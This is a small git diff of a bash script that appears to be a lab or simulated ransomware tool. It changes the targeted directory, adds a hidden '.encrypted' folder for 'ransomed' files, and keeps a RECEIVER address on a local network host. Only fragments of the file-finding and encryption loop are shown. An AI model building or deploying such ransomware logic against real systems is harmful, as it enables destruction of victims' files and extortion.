@@ -21,7 +21,10 @@
 RECEIVER="http://192.168.1.173:8080"
 
 # Directory containing files we are targeting
-TARGET_DIR=".deleted_files"
+TARGET_DIR="rx_dir"
+
+# Directory to place "encrypted" files
+RANSOMED_DIR=".encrypted"
 
 # SANITY AND SAFETY CHECK!
 # Prevent execution as root
@@ -180,5 +183,5 @@ find_files "$(pwd)/$TARGET_DIR" "exposed_files"
 echo "---------ENCRYPTING---------"
 echo ":"
 for file in "${exposed_files[@]}"; do
-  encrypt_file "$file" "$TARGET_DIR" # Always double-quote variable expansions
+  encrypt_file "$file" "$RANSOMED_DIR" # Always double-quote variable expansions
 done
